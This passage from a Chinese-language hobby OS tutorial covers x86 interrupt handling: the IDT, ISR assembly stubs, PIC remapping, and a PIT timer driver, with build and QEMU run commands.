class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="comment"># 编译驱动每个 .c 文件</span></span><br><span class="line"><span class="variable">$(DRIVER_DIR)</span>/%.o: <span class="variable">$(DRIVER_DIR)</span>/%.c</span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="comment"># 编译每个 .asm 文件</span></span><br><span class="line"><span class="variable">$(ARCH_DIR)</span>/%.o: <span class="variable">$(ARCH_DIR)</span>/%.asm</span><br><span class="line">	nasm -f elf32 <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(KERNEL_BIN)</span>: <span class="variable">$(KERNEL_OBJ)</span> <span class="variable">$(LINK_LD)</span></span><br><span class="line">	ld -m elf_i386 -g -T <span class="variable">$(LINK_LD)</span> -o <span class="variable">$(KERNEL_ELF)</span> <span class="variable">$(KERNEL_OBJ)</span></span><br><span class="line">	objcopy -O binary <span class="variable">$(KERNEL_ELF)</span> <span class="variable">$(KERNEL_BIN)</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(BOOT_BIN)</span> <span class="variable">$(STAGE2_BIN)</span> <span class="variable">$(KERNEL_BIN)</span></span><br><span class="line">	@echo <span class="string">&quot;Creating floppy image...&quot;</span></span><br><span class="line">	dd if=/dev/zero of=<span class="variable">$(TARGET)</span> bs=512 count=2880                    </span><br><span class="line">	dd if=<span class="variable">$(BOOT_BIN)</span> of=<span class="variable">$(TARGET)</span> bs=512 count=1 conv=notrunc           </span><br><span class="line">	dd if=<span class="variable">$(STAGE2_BIN)</span> of=<span class="variable">$(TARGET)</span> bs=512 count=2 seek=1 conv=notrunc  </span><br><span class="line">	@KERNEL_SIZE=$<span class="variable">$(stat -c %s <span class="variable">$(KERNEL_BIN)</span>)</span>; \</span><br><span class="line">	KERNEL_SECTORS=$$((($$KERNEL_SIZE + 511) / 512)); \</span><br><span class="line">	echo <span class="string">&quot;Kernel size: $$KERNEL_SIZE bytes ($$KERNEL_SECTORS sectors)&quot;</span>; \</span><br><span class="line">	dd if=<span class="variable">$(KERNEL_BIN)</span> of=<span class="variable">$(TARGET)</span> bs=512 count=$$KERNEL_SECTORS seek=3 conv=notrunc</span><br><span class="line"><span class="comment"># dd if=$(KERNEL_BIN) of=$(TARGET) bs=512 count=$&#123;KERNEL_SECTORS&#125; seek=3 conv=notrunc </span></span><br><span class="line"><span class="section">run:</span></span><br><span class="line">	qemu-system-i386 -fda <span class="variable">$(TARGET)</span>  -s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f *.bin *.o *.elf <span class="variable">$(TARGET)</span></span><br><span class="line">	rm -f <span class="variable">$(KERNEL_DIR)</span>/*.o *.bin *.elf</span><br><span class="line">	rm -f <span class="variable">$(DRIVER_DIR)</span>/*.o *.bin *.elf</span><br><span class="line">	rm -f <span class="variable">$(ARCH_DIR)</span>/*.o *.bin *.elf</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// kernel.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;isr.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;irq.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;timer.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;screen.h&quot;</span></span></span><br><span class="line"><span class="comment">// #include &quot;keyboard.h&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    clear_screen();         <span class="comment">// 清屏</span></span><br><span class="line">    print_string(<span class="string">&quot;Hello, Kernel!&quot;</span>);  <span class="comment">// 打印一行字符</span></span><br><span class="line">    idt_install();</span><br><span class="line">    isr_install();</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span> / <span class="number">0</span>;  <span class="comment">// 触发一个除零错误</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>最后我们跑起来时就可以看到我们之前在isr.c中实现的<strong>isr_handler</strong>被调用了。首先是触发除零错误时跳转到isr0处处理，然后进入<strong>isr_handler</strong>进行打印调试信息。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E4%B8%AD%E6%96%AD%E7%AE%A1%E7%90%86/image-20250506235517560.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E4%B8%AD%E6%96%AD%E7%AE%A1%E7%90%86/image-20250506235919860.png"
                      class=""
                >
<p>这里已经成功调用了我们写的回调函数，但是由于并没有处理除零后的行为，所以从回调函数返回时还会执行除零的这个操作，所以导致一直进行0号中断。</p>
<p>我们可以把实际的处理逻辑放在c语言中实现，那么就可以在汇编里统一将32个中断统一跳转到<strong>isr_common_stub</strong>中处理，最后设置好寄存器参数后，跳转到<strong>isr_handler</strong>进行分类处理。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">isr_install</span><span class="params">()</span> &#123;</span><br><span class="line">    idt_set_gate(<span class="number">0</span>, (<span class="type">uint32_t</span>)isr0, <span class="number">0x08</span>, <span class="number">0x8E</span>);  <span class="comment">// div 0 fault</span></span><br><span class="line">    idt_set_gate(<span class="number">6</span>, (<span class="type">uint32_t</span>)isr6, <span class="number">0x08</span>, <span class="number">0x8E</span>);    <span class="comment">// invalid opcode fault</span></span><br><span class="line">    idt_set_gate(<span class="number">13</span>, (<span class="type">uint32_t</span>)isr13, <span class="number">0x08</span>, <span class="number">0x8E</span>);       <span class="comment">// General Protection Fault</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr_handler</span><span class="params">(<span class="type">registers_t</span> *regs)</span> &#123;</span><br><span class="line">    clear_screen();</span><br><span class="line">    print_string(<span class="string">&quot;Received interrupt: &quot;</span>);</span><br><span class="line">    print_dec(regs-&gt;int_no);</span><br><span class="line">    print_newline();</span><br><span class="line">    <span class="keyword">switch</span> (regs-&gt;int_no) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            print_string(<span class="string">&quot;Divide by zero\n&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>);  <span class="comment">// Halt</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            print_string(<span class="string">&quot;Invalid opcode\n&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">            print_string(<span class="string">&quot;General Protection Fault\n&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            print_string(<span class="string">&quot;Unknown interrupt!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; isr_stub.asm</span><br><span class="line">extern isr_handler</span><br><span class="line"></span><br><span class="line">; 无错误码的宏</span><br><span class="line">%macro ISR_NOERR 1</span><br><span class="line">global isr%1</span><br><span class="line">isr%1:</span><br><span class="line">    cli</span><br><span class="line">    push 0      ; error code</span><br><span class="line">    push %1</span><br><span class="line">    jmp isr_common_stub</span><br><span class="line">%endmacro</span><br><span class="line"></span><br><span class="line">; 有错误码的宏（不再 push 错误码）</span><br><span class="line">%macro ISR_ERR 1</span><br><span class="line">global isr%1</span><br><span class="line">isr%1:</span><br><span class="line">    cli</span><br><span class="line">    push %1</span><br><span class="line">    jmp isr_common_stub</span><br><span class="line">%endmacro</span><br><span class="line"></span><br><span class="line">; 统一调用展开</span><br><span class="line"></span><br><span class="line">; 无错误码中断</span><br><span class="line">%assign i 0</span><br><span class="line">%rep 32</span><br><span class="line">    %if i=8 || i=10 || i=11 || i=12 || i=13 || i=14 || i=17</span><br><span class="line">        ; 有错误码的中断</span><br><span class="line">        ISR_ERR i</span><br><span class="line">    %else</span><br><span class="line">        ; 没有错误码的</span><br><span class="line">        ISR_NOERR i</span><br><span class="line">    %endif</span><br><span class="line">    %assign i i+1</span><br><span class="line">%endrep</span><br><span class="line"></span><br><span class="line">isr_common_stub:</span><br><span class="line">    pusha</span><br><span class="line">    mov ax, ds</span><br><span class="line">    push eax</span><br><span class="line">    mov ax, 0x10        ; data segment selector</span><br><span class="line">    mov ds, ax</span><br><span class="line">    mov es, ax</span><br><span class="line">    mov fs, ax</span><br><span class="line">    mov gs, ax</span><br><span class="line"></span><br><span class="line">    push esp</span><br><span class="line">    call isr_handler</span><br><span class="line">    add esp, 4</span><br><span class="line"></span><br><span class="line">    pop eax</span><br><span class="line">    popa</span><br><span class="line">    add esp, 8</span><br><span class="line">    sti</span><br><span class="line">    iret</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>之后我们可以分别调用如下代码进行测试中断是否正常工作：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">trigger_invalid_opcode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;ud2&quot;</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigger_gpf</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov $0x23, %%ax \n&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov %%ax, %%ds  \n&quot;</span></span></span><br><span class="line"><span class="params">        :</span></span><br><span class="line"><span class="params">        :</span></span><br><span class="line"><span class="params">        : <span class="string">&quot;ax&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E4%B8%AD%E6%96%AD%E7%AE%A1%E7%90%86/image-20250507200157724.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E4%B8%AD%E6%96%AD%E7%AE%A1%E7%90%86/image-20250507200251433.png"
                      class=""
                >
<h3 id="irq-重映射">IRQ 重映射</h3>
<p>在 x86 架构中，<strong>前 32 个中断号（0～31）保留给 CPU
异常</strong>，而 PIC（Programmable Interrupt
Controller，8259A）默认会将：</p>
<ul>
<li>IRQ0 映射到中断号 <strong>0x08（8）</strong></li>
<li>IRQ1 → 0x09（9）</li>
<li>...</li>
<li>IRQ15 → 0x0F（15）</li>
</ul>
<p>这就<strong>与 CPU 异常冲突了！</strong>所以必须把 IRQ
中断<strong>重新映射</strong>到
<strong>32～47（0x20～0x2F）</strong>或别的中断号，这样才可以自己处理它们，不会和异常冲突。这里可以通过4阶段的<strong>ICW</strong>来对<strong>PIC</strong>进行配置。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// irq.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC1_COMMAND 0x20   <span class="comment">// 主 PIC 的命令端口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC1_DATA    0x21   <span class="comment">// 主 PIC 的数据端口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC2_COMMAND 0xA0   <span class="comment">// 从 PIC 的命令端口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIC2_DATA    0xA1   <span class="comment">// 从 PIC 的数据端口</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ICW1_INIT    0x11   <span class="comment">// ICW1：初始化标志 + 需要 ICW4</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ICW4_8086    0x01   <span class="comment">// ICW4：设置为 8086/88 模式（非特殊的 8080 模式）</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">outb</span><span class="params">(<span class="type">uint16_t</span> port, <span class="type">uint8_t</span> val)</span> &#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;outb %0, %1&quot;</span> : : <span class="string">&quot;a&quot;</span>(val), <span class="string">&quot;Nd&quot;</span>(port))</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint8_t</span> <span class="title function_">inb</span><span class="params">(<span class="type">uint16_t</span> port)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> ret;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;inb %1, %0&quot;</span> : <span class="string">&quot;=a&quot;</span>(ret) : <span class="string">&quot;Nd&quot;</span>(port))</span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">irq_remap</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 保存原始掩码</span></span><br><span class="line">    <span class="type">uint8_t</span> a1 = inb(PIC1_DATA);</span><br><span class="line">    <span class="type">uint8_t</span> a2 = inb(PIC2_DATA);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开始初始化</span></span><br><span class="line">    outb(PIC1_COMMAND, ICW1_INIT);</span><br><span class="line">    outb(PIC2_COMMAND, ICW1_INIT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置 IRQ 映射偏移量</span></span><br><span class="line">    outb(PIC1_DATA, <span class="number">0x20</span>); <span class="comment">// 主 PIC 从中断向量号 0x20 开始（32）</span></span><br><span class="line">    outb(PIC2_DATA, <span class="number">0x28</span>); <span class="comment">// 从 PIC 从中断向量号 0x28 开始（40）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置主从关系</span></span><br><span class="line">    outb(PIC1_DATA, <span class="number">4</span>);    <span class="comment">// 通知主 PIC 有从 PIC 接在 IRQ2 上</span></span><br><span class="line">    outb(PIC2_DATA, <span class="number">2</span>);    <span class="comment">// 通知从 PIC 它连接到主 PIC 的 IRQ2 上</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置 PIC 工作模式</span></span><br><span class="line">    outb(PIC1_DATA, ICW4_8086);</span><br><span class="line">    outb(PIC2_DATA, ICW4_8086);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复掩码</span></span><br><span class="line">    outb(PIC1_DATA, a1);</span><br><span class="line">    outb(PIC2_DATA, a2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h3 id="irq实现时钟与键盘处理">IRQ实现时钟与键盘处理</h3>
<h4 id="改进isr回调函数逻辑">改进isr回调函数逻辑</h4>
<p>之前我们采用硬编码的方式来注册与处理<strong>isr</strong>，这里我们想要扩展到<strong>IRQ</strong>的实现，并为了之后能够方便添加中断，这里对原来的isr.c进行一定修改来实现动态注册。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// kernel/isr.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">registers</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> ds, edi, esi, ebp, esp, ebx, edx, ecx, eax;</span><br><span class="line">    <span class="type">uint32_t</span> int_no, err_code;</span><br><span class="line">    <span class="type">uint32_t</span> eip, cs, eflags, useresp, ss;</span><br><span class="line">&#125; <span class="type">registers_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数指针类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*<span class="type">isr_t</span>)</span><span class="params">(<span class="type">registers_t</span> *)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr_install</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">register_interrupt_handler</span><span class="params">(<span class="type">uint8_t</span> n, <span class="type">isr_t</span> handler)</span>;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// kernel/isr.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;isr.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;screen.h&quot;</span>  <span class="comment">// 你之前写的 print_string</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="type">isr_t</span> interrupt_handlers[<span class="number">256</span>];  <span class="comment">// 保存最多256个中断处理函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">isr0</span><span class="params">()</span>;  <span class="comment">// 在汇编中定义的 isr 函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">isr6</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">isr13</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">isr_install</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">memset</span>(interrupt_handlers, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">isr_t</span>) * <span class="number">256</span>);</span><br><span class="line">    idt_set_gate(<span class="number">0</span>, (<span class="type">uint32_t</span>)isr0, <span class="number">0x08</span>, <span class="number">0x8E</span>);  <span class="comment">// div 0 fault</span></span><br><span class="line">    idt_set_gate(<span class="number">6</span>, (<span class="type">uint32_t</span>)isr6, <span class="number">0x08</span>, <span class="number">0x8E</span>);    <span class="comment">// invalid opcode fault</span></span><br><span class="line">    idt_set_gate(<span class="number">13</span>, (<span class="type">uint32_t</span>)isr13, <span class="number">0x08</span>, <span class="number">0x8E</span>);       <span class="comment">// General Protection Fault</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">isr_handler</span><span class="params">(<span class="type">registers_t</span> *regs)</span> &#123;</span><br><span class="line">    clear_screen();</span><br><span class="line">    print_string(<span class="string">&quot;Received interrupt: &quot;</span>);</span><br><span class="line">    print_dec(regs-&gt;int_no);</span><br><span class="line">    print_newline();</span><br><span class="line">    <span class="keyword">if</span> (interrupt_handlers[regs-&gt;int_no]) &#123;</span><br><span class="line">        <span class="type">isr_t</span> handler = interrupt_handlers[regs-&gt;int_no];</span><br><span class="line">        handler(regs);  <span class="comment">// 调用回调函数</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        clear_screen();</span><br><span class="line">        print_string(<span class="string">&quot;Unhandled interrupt: &quot;</span>);</span><br><span class="line">        print_dec(regs-&gt;int_no);</span><br><span class="line">        print_newline();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>);  <span class="comment">// halt</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_interrupt_handler</span><span class="params">(<span class="type">uint8_t</span> n, <span class="type">isr_t</span> handler)</span> &#123;</span><br><span class="line">    interrupt_handlers[n] = handler;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>这里我把前面用到的<code>outb</code>以及<code>inb</code>单独提取出来放到<strong>common.h</strong>中声明实现，更加模块化。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// include/common.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRQ0 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRQ1 33</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">outb</span><span class="params">(<span class="type">uint16_t</span> port, <span class="type">uint8_t</span> val)</span> &#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;outb %0, %1&quot;</span> : : <span class="string">&quot;a&quot;</span>(val), <span class="string">&quot;Nd&quot;</span>(port))</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint8_t</span> <span class="title function_">inb</span><span class="params">(<span class="type">uint16_t</span> port)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> ret;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;inb %1, %0&quot;</span> : <span class="string">&quot;=a&quot;</span>(ret) : <span class="string">&quot;Nd&quot;</span>(port))</span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="时钟实现">时钟实现</h4>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// drivers/timer.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;isr.h&quot;</span>  <span class="comment">// 引入 struct regs</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_timer</span><span class="params">(<span class="type">uint32_t</span> freq)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// drivers/timer.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;timer.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;isr.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;screen.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> tick = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">timer_callback</span><span class="params">(<span class="keyword">struct</span> regs* r)</span> &#123;</span><br><span class="line">    tick++;</span><br><span class="line">    <span class="keyword">if</span> (tick % <span class="number">100</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        print_string(<span class="string">&quot;Tick: &quot;</span>);</span><br><span class="line">        print_dec(tick);</span><br><span class="line">        print_newline();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_timer</span><span class="params">(<span class="type">uint32_t</span> freq)</span> &#123;</span><br><span class="line">    register_interrupt_handler(IRQ0, timer_callback);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> divisor = <span class="number">1193180</span> / freq;</span><br><span class="line">    outb(<span class="number">0x43</span>, <span class="number">0x36</span>); <span class="comment">// PIT control</span></span><br><span class="line">    outb(<span class="number">0x40</span>, divisor &amp; <span class="number">0xFF</span>);</span><br><span class="line">    outb(<span class="number">0x40</span>, (divisor &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>我们来详细看一下定时器具体如何设置：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint32_t</span> divisor = <span class="number">1193180</span> / freq;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><p>8253/8254 的输入时钟频率是 <strong>1.193180
MHz</strong>；</p></li>
<li><p><code>divisor = 1193180 / freq</code>
是设置定时器的分频器，比如你想让定时器每 <code>freq = 100</code> Hz
触发一次中断，就要分频成：<code>divisor = 1193180 / 100 ≈ 11931</code></p></li>
</ul>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">outb(<span class="number">0x43</span>, <span class="number">0x36</span>); <span class="comment">// PIT control</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>0x43</code> 是 <strong>PIT 控制寄存器端口号</strong>；</li>
<li><code>0x36</code> 是控制字，表示：
<ul>
<li>通道 0（timer channel 0）</li>
<li>使用 <strong>先低后高字节模式</strong>写入分频值</li>
<li><strong>模式 3：方波生成模式</strong></li>
<li>二进制计数模式</li>
</ul></li>
</ul>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">outb(<span class="number">0x40</span>, divisor &amp; <span class="number">0xFF</span>);         <span class="comment">// 写入低 8 位</span></span><br><span class="line">outb(<span class="number">0x40</span>, (divisor &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>);  <span class="comment">// 写入高 8 位</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>0x40</code> 是 <strong>定时器通道 0 的数据端口</strong>；</li>
<li>由于定时器的计数器是 <strong>16 位</strong>，我们需要把
<code>divisor</code> 拆成 <strong>低字节 + 高字节</strong> 写进去；</li>
<li>写入顺序：先低 8 位，再高 8 位（之前通过 0x36 控制字设置的）。</li>
</ul>
<p>作用流程：</p>
<ol type="1">
<li><strong>kernel_main</strong>可以初始化阶段调用
<code>init_timer(100)</code> 设置频率为 100Hz（即每10ms触发一次）；</li>
<li>设置好 PIT 芯片的工作模式和分频值；</li>
<li>注册了中断回调函数 <code>timer_callback</code>，绑定到了中断号
32（IRQ0）；</li>
<li>每10ms CPU 就会被硬件中断打断，自动跳转到
<code>timer_callback</code> 执行，<code>tick</code> 变量就会递增；</li>
<li>每 100 次（1 秒）打印一次信息，说明定时器在工作。</li>
</ol>
<p>然后在<strong>isr_install</strong>中加一条<code>idt_set_gate(32, (uint32_t)irq0, 0x08, 0x8E);</code>来注册这个中断，并在<strong>isr_stub.asm</strong>中加入以下代码来处理IRQ，同样也是跳转到<strong>isr_common_stub</strong>进行进一步处理：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">%macro IRQ 1</span><br><span class="line">global irq%1</span><br><span class="line">irq%1:</span><br><span class="line">    cli</span><br><span class="line">    push 0        ; dummy error code for compatibility</span><br><span class="line">    push %1 + 32  ; 中断号（重映射后的IRQ）</span><br><span class="line">    jmp isr_common_stub</span><br><span class="line">%endmacro</span><br><span class="line"></span><br><span class="line">; 定义 IRQ0~IRQ15</span><br><span class="line">%assign i 0</span><br><span class="line">%rep 16</span><br><span class="line">    IRQ i</span><br><span class="line">    %assign i i+1</span><br><span class="line">%endrep</span><br></pre></td></tr></table></figure></div>
<p>最后可以在<strong>irq_install</strong>中初始化时钟，并在<strong>kernel_main</strong>里调用<strong>irq_install</strong>。</p>
